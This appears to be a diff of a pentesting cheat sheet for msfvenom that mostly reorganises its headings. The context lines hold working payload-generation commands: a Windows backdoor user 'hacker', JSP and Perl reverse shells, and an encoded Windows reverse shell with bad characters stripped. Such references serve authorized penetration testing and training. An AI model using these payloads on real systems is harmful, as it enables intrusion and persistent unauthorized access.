@@ -1,5 +1,7 @@
 # Msfvenom
 
+## Operating System Payloads
+
 ### Windows Payloads <a id="windows-payloads"></a>
 
 ```text
@@ -25,7 +27,7 @@ Add a user in windows with msfvenom:
 msfvenom -p windows/adduser USER=hacker PASS=password -f exe > useradd.exe
 ```
 
-### Web Payloads <a id="web-payloads"></a>
+## Web Payloads
 
 PHP
 
@@ -52,7 +54,7 @@ WAR
 msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f war > shell.war
 ```
 
-### Scripting Payloads <a id="scripting-payloads"></a>
+## Scripting Payloads
 
 Python
 
@@ -72,7 +74,9 @@ Perl
 msfvenom -p cmd/unix/reverse_perl LHOST= LPORT= -f raw > shell.pl
 ```
 
-Creating an msfvenom payload with an encoder while removing bad characters:
+## Memory Corruption Payloads
+
+Creating a msfvenom payload with an encoder while removing bad characters:
 
 ```text
 msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT -f c -e x86/shikata_ga_nai -b "\x0A\x0D"
